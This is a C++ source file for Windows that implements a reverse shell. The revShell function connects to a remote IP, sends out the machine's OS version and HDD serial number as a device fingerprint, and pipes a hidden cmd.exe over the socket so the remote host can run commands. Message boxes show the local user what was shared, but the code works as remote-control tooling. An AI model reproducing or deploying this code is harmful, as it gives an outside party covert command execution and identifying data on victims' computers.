#pragma once

#include "functions.h"

string getLocalIP() {
    char hostName[256];
    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
        return "Unknown IP";
    }

    struct hostent* host = gethostbyname(hostName);
    if (host == NULL) {
        return "Unknown IP";
    }

    struct in_addr addr;
    memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
    return inet_ntoa(addr);
}

void checkHeartBeat(SOCKET s) {
    char buffer[1];
    while (true) {
        int result = recv(s, buffer, sizeof(buffer), MSG_PEEK);

        if (result == 0) {
            MessageBoxA(NULL, "You were removed from server watchlist", "Connection lost", MB_OK | MB_ICONERROR);
            break;
        }
        Sleep(5000);
    }
}

string getHDDSerialNumber() {

    char buffer[128];
    string result = "";
    FILE* pipe = _popen("wmic path win32_physicalmedia get SerialNumber", "r");

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    _pclose(pipe);

    size_t pos = result.find("SerialNumber");
    if (pos != string::npos) {
        result.erase(pos, string("SerialNumber").length());
    }

    result.erase(0, result.find_first_not_of(" \n\r\t"));
    result.erase(result.find_last_not_of(" \n\r\t") + 1);

    if (!result.empty() && result.back() == '.') {
        result.pop_back();
    }

    return result;
}

string getWindowsVersion() {
    if (IsWindows8OrGreater()) return "Windows 10";
    if (IsWindows7OrGreater()) return "Windows 7";
    return "Unknown Windows Version";
}

void sendClientInfo(SOCKET s) {
    string osInfo = getWindowsVersion();
    string deviceFingerprint = getHDDSerialNumber();

    string message = "OS: " + osInfo + "\n" + deviceFingerprint + "\n";

    send(s, message.c_str(), message.length(), 0);
}

void revShell(char* ip) {

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REV_SHELL_PORT);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {

        MessageBoxA(NULL, "Server unreachable or offline!", "Connection Error", MB_OK | MB_ICONERROR);
    }
    else {
        string localIP = getLocalIP();
        string osInfo = getWindowsVersion();
        string hddSerial = getHDDSerialNumber();

        string whatWasShared = "Shared info:\nIP: " + localIP + "\n" +
            "OS: " + osInfo + "\n" +
            "HDD Serial: " + hddSerial;

        MessageBoxA(NULL, whatWasShared.c_str(), "Connection successful", MB_OK | MB_ICONASTERISK);

        sendClientInfo(s);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        HANDLE hStdInRead, hStdInWrite, hStdOutRead, hStdOutWrite;

        CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
        CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);

        SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

        si.hStdInput = hStdInRead;
        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdOutWrite;

        CreateProcessA(NULL, (LPSTR)"\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        CloseHandle(hStdInRead);
        CloseHandle(hStdOutWrite);

        thread s2p_thread([&]() {
            char buffer[1024];
            DWORD bytesWritten;
            while (true) {
                int bytesReceived = recv(s, buffer, sizeof(buffer), 0);
                if (bytesReceived <= 0) {
                    break;
                }
                WriteFile(hStdInWrite, buffer, bytesReceived, &bytesWritten, NULL);
            }
            });

        thread p2s_thread([&]() {
            char buffer[1024];
            DWORD bytesRead;
            while (true) {
                if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                    send(s, buffer, bytesRead, 0);
                }
                else {
                    break;
                }
            }
            });

        thread heartbeat_thread(checkHeartBeat, s);

        s2p_thread.join();
        p2s_thread.join();
        heartbeat_thread.join();

        CloseHandle(hStdInWrite);
        CloseHandle(hStdOutRead);
        closesocket(s);
        WSACleanup();
    }
}
